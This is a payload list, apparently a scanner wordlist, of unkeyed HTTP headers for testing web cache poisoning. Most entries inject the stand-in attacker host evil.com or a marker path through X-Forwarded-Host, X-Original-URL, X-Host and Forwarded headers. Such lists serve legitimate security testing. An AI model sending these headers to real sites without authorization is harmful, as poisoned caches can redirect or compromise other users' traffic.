# Web Cache Poisoning Payloads
# Unkeyed headers and parameters for cache poisoning attacks

# ====================================
# Unkeyed Headers (X-Forwarded-*)
# ====================================

# X-Forwarded-Host - Most common cache poisoning vector
X-Forwarded-Host: evil.com
X-Forwarded-Host: JARWIS_CACHE_MARKER.evil.com

# X-Forwarded-Server
X-Forwarded-Server: evil.com
X-Forwarded-Server: JARWIS_CACHE_MARKER.evil.com

# X-Forwarded-Scheme/Proto
X-Forwarded-Scheme: http
X-Forwarded-Proto: http
X-Forwarded-Proto: https

# X-Forwarded-Port
X-Forwarded-Port: 443
X-Forwarded-Port: 8080

# X-Forwarded-Prefix
X-Forwarded-Prefix: /JARWIS_CACHE_MARKER

# ====================================
# URL Rewrite Headers
# ====================================

X-Original-URL: /JARWIS_CACHE_MARKER
X-Rewrite-URL: /JARWIS_CACHE_MARKER
X-Original-Host: evil.com
X-Original-Path: /JARWIS_CACHE_MARKER

# ====================================
# Host Override Headers
# ====================================

X-Host: evil.com
X-HTTP-Host-Override: evil.com
X-Forwarded-Host: evil.com
Forwarded: host=evil.com

# ====================================
# Debug/Special Headers
# ====================================

X-Real-IP: 127.0.0.1
